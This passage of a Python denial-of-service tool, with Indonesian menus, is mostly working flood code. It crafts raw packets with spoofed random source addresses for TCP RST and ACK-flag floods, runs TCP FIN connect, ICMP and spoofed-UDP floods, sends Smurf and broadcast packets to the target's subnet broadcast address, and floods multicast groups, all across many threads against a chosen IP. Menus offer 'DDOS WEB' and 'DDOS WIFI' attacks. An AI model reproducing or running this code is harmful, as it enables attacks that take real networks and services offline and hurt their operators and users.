                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    ip_header = struct.pack("!BBHHHBBH4s4s",
                        0x45, 0, 40, random.randint(0, 65535), 0, 64, 6, 0,
                        socket.inet_aton(src_ip), socket.inet_aton(ip))
                    tcp_header = struct.pack("!HHLLBBHHH",
                        random.randint(1, 65535), random.randint(1, 65535),
                        0, 0, 5 << 4, 0x10, 65535, 0, 0)
                    s.sendto(ip_header + tcp_header, (ip, 0))
                except:
                    pass
        except:
            pass

    def tcp_fin_flood():
        nonlocal stop_attack
        while not stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect((ip, random.randint(1, 65535)))
                s.shutdown(socket.SHUT_RDWR)
                s.close()
            except:
                pass

    def tcp_rst_flood():
        nonlocal stop_attack
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while not stop_attack:
                try:
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    ip_header = struct.pack("!BBHHHBBH4s4s",
                        0x45, 0, 40, random.randint(0, 65535), 0, 64, 6, 0,
                        socket.inet_aton(src_ip), socket.inet_aton(ip))
                    tcp_header = struct.pack("!HHLLBBHHH",
                        random.randint(1, 65535), random.randint(1, 65535),
                        0, 0, 5 << 4, 0x04, 0, 0, 0)
                    s.sendto(ip_header + tcp_header, (ip, 0))
                except:
                    pass
        except:
            pass

    def icmp_flood():
        nonlocal stop_attack
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            while not stop_attack:
                packet = b"\x08\x00" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00" + random._urandom(56)
                s.sendto(packet, (ip, 0))
        except:
            pass

    def icmp_smurf():
        nonlocal stop_attack
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            broadcast = ".".join(ip.split(".")[:3]) + ".255"
            while not stop_attack:
                packet = b"\x08\x00" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00" + random._urandom(56)
                s.sendto(packet, (broadcast, 0))
        except:
            pass

    def ip_spoof_udp():
        nonlocal stop_attack
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while not stop_attack:
                try:
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    ip_header = struct.pack("!BBHHHBBH4s4s",
                        0x45, 0, 28 + 1024, random.randint(0, 65535), 0, 64, 17, 0,
                        socket.inet_aton(src_ip), socket.inet_aton(ip))
                    payload = random._urandom(1024)
                    s.sendto(ip_header + payload, (ip, random.randint(1, 65535)))
                except:
                    pass
        except:
            pass

    def broadcast_flood():
        nonlocal stop_attack
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 8)
        except:
            pass
        broadcast = ".".join(ip.split(".")[:3]) + ".255"
        payload = random._urandom(65500)
        while not stop_attack:
            try:
                for _ in range(100):
                    s.sendto(payload, (broadcast, random.randint(1, 65535)))
            except:
                pass

    def multicast_flood():
        nonlocal stop_attack
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 8)
        except:
            pass
        multicast_addrs = ["224.0.0.1", "224.0.0.251", "239.255.255.250", "224.0.1.1", "224.0.1.22"]
        payload = random._urandom(65500)
        while not stop_attack:
            try:
                for addr in multicast_addrs:
                    for _ in range(20):
                        s.sendto(payload, (addr, random.randint(1, 65535)))
            except:
                pass

    all_methods = {
        "1": udp_flood_ultimate, "2": udp_fragment_flood, "3": udp_port_rotation,
        "4": raw_socket_flood, "5": tcp_syn_flood, "6": tcp_ack_flood,
        "7": tcp_fin_flood, "8": tcp_rst_flood, "9": icmp_flood,
        "10": icmp_smurf, "11": ip_spoof_udp, "12": broadcast_flood, "13": multicast_flood,
    }

    if method_choice == "0":
        selected_methods = list(all_methods.values())
    else:
        selected_methods = [all_methods[method_choice]] if method_choice in all_methods else [udp_flood_ultimate]

    root_only = [raw_socket_flood, tcp_ack_flood, tcp_rst_flood, icmp_flood, icmp_smurf, ip_spoof_udp]

    if os.geteuid() != 0:
        filtered = []
        for m in selected_methods:
            if m in root_only:
                print(f"{C}[!] {m.__name__} butuh root, lewati.{N}")
            else:
                filtered.append(m)
        if filtered:
            selected_methods = filtered
        else:
            print(f"{R}[!] Semua method butuh root.{N}")
            selected_methods = [udp_flood_ultimate]

    threads = []
    for i in range(THREAD_COUNT):
        attack_func = random.choice(selected_methods)
        t = threading.Thread(target=attack_func)
        t.daemon = True
        t.start()
        threads.append(t)

    print(f"{G}{BOX_TOP}{N}")
    print(box_header('SERANGAN DIMULAI!'))
    print(f"{G}{BOX_BOT}{N}")
    print(f"{C}  Tekan {R}CTRL + C{C} untuk stop.{N}\n")

    if DURATION > 0:
        try:
            time.sleep(DURATION)
            stop_attack = True
            print(f"\n{C}[!] Serangan selesai setelah {DURATION} detik.{N}")
            input(f"\n{C}Tekan Enter untuk kembali...{N}")
            return
        except KeyboardInterrupt:
            stop_attack = True
            print(f"\n{R}[!] CTRL+C diterima.{N}")
            print(f"{G}[OK] Serangan dihentikan.{N}")
            input(f"\n{C}Tekan Enter untuk kembali...{N}")
            return

    try:
        while not stop_attack:
            time.sleep(5)
            print(f"{C}[+] Thread aktif: {R}{threading.active_count()}{C} | Target: {B}{ip}{N}")
    except KeyboardInterrupt:
        stop_attack = True
        print(f"\n{R}[!] CTRL+C diterima.{N}")
        print(f"{G}[OK] Serangan dihentikan.{N}")
        input(f"\n{C}Tekan Enter untuk kembali...{N}")

# ============================================================
# ============== SUB MENU DDOS WEB ==========================
# ============================================================

def sub_menu_ddos_web():
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(banner)

        print(f"{G}{BOX_TOP}{N}")
        print(box_header('SUB MENU DDOS WEB'))
        print(f"{G}{BOX_BOT}{N}")
        print(f"{C}[1] DDOS WEB{N}")
        print(f"{C}[2] CEK WEB{N}")
        print(f"{Y}[0] Kembali{N}")

        pilihan = input(f"\n{B}Pilih menu (0-2): {N}").strip()

        if pilihan == "1":
            ddos_web()
        elif pilihan == "2":
            cek_web()
        elif pilihan == "0":
            return
        else:
            print(f"{R}[!] Pilihan tidak valid!{N}")
            time.sleep(1)

# ============================================================
# ============== MENU UTAMA =================================
# ============================================================

def menu_utama():
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(banner)

        print(f"{G}{BOX_TOP}{N}")
        print(box_header('MENU UTAMA'))
        print(f"{G}{BOX_BOT}{N}")
        print(f"{C}[1] DDOS WEB{N}")
        print(f"{C}[2] DDOS WIFI{N}")
        print(f"{Y}[0] EXIT{N}")

        pilihan = input(f"\n{B}Pilih menu (0-2): {N}").strip()

        if pilihan == "1":
            sub_menu_ddos_web()
        elif pilihan == "2":
            ddos_wifi()
        elif pilihan == "0":
            print(f"\n{G}[!] Keluar...{N}")
            sys.exit()
        else:
            print(f"{R}[!] Pilihan tidak valid!{N}")
            time.sleep(1)

# ========== JALANKAN ==========
if __name__ == "__main__":
    menu_utama()
